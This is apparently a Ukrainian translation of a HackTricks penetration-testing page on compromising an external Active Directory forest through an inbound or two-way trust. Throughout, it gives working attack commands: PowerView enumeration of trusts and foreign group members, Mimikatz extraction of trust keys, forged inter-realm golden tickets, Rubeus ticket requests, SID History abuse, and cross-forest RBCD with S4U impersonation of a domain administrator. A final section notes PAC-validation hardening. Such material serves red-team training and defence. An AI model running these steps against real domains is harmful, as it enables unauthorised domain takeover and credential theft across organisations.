# External Forest Domain - OneWay (Inbound) або двонапрямний

{{#include ../../banners/hacktricks-training.md}}

У цьому сценарії зовнішній домен довіряє вам (або ви довіряєте один одному), тому ви можете отримати певний рівень доступу до нього.

## Перерахування

Перш за все, потрібно **перерахувати** **trust**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` дають змогу швидко визначити, чи, ймовірно, спрацюють шляхи cross-forest abuse (RBCD, SIDHistory) без додаткових prerequisites.<sup>[[2]](#references)</sup>

Під час попереднього enumeration було виявлено, що користувач **`crossuser`** входить до групи **`External Admins`**, яка має **Admin access** до **DC зовнішнього домену**.

## Initial Access

Якщо ви **не змогли** знайти жодного **special** доступу свого користувача в іншому домені, ви все одно можете повернутися до AD Methodology і спробувати виконати **privesc від непривілейованого користувача** (наприклад, за допомогою kerberoasting):

Ви можете використовувати **Powerview functions**, щоб **enumerate** **інший домен**, використовуючи параметр `-Domain`, як у:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Імітація особи

### Вхід

Використовуючи звичайний метод із обліковими даними користувача, який має доступ до зовнішнього домену, ви повинні отримати доступ до нього:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History Abuse

Ви також можете зловживати [**SID History**](sid-history-injection.md) через forest trust.

Якщо користувача мігровано **з одного forest до іншого**, а **SID Filtering не увімкнено**, стає можливим **додати SID з іншого forest**, і цей **SID** буде **додано до токена користувача** під час автентифікації **через trust**.

> [!WARNING]
> Нагадуємо, що отримати signing key можна за допомогою
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Ви можете **підписати за допомогою** **trusted** key **TGT, що імітує** користувача поточного домену.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Повний спосіб імперсонації користувача
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD, коли ви контролюєте обліковий запис комп'ютера в довіреному лісі (без SID filtering / selective auth)

Якщо ваш foreign principal (FSP) надає вам членство в групі, яка може записувати об'єкти комп'ютерів у довіреному лісі (наприклад, `Account Operators` або спеціальна provisioning group), ви можете налаштувати **Resource-Based Constrained Delegation** на цільовому хості цього лісу та імперсонувати будь-якого користувача в ньому:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Це працює лише тоді, коли **SelectiveAuthentication вимкнено**, а **SID filtering** не видаляє ваш SID, що використовується для керування. Це швидкий шлях латерального переміщення, який не потребує підроблення SIDHistory і часто не враховується під час перевірки trust.<sup>[[2]](#references)</sup>

### Посилення перевірки PAC

Оновлення перевірки підпису PAC для **CVE-2024-26248**/**CVE-2024-29056** додають вимогу підписування для міжлісових квитків. У **Compatibility mode** підроблені міжреальнісні PAC/SIDHistory/S4U-шляхи все ще можуть працювати на невиправлених DC. У **Enforcement mode** непідписані або змінені дані PAC, що проходять через forest trust, відхиляються, якщо ви також не маєте ключа trust цільового forest. Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) можуть послабити цей захист, поки вони залишаються доступними.<sup>[[1]](#references)</sup>

## References

- [1] [Microsoft KB5037754 – зміни перевірки PAC для CVE-2024-26248 і CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [2] [Специфікація MS-PAC – SID filtering і деталі трансформації claims](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
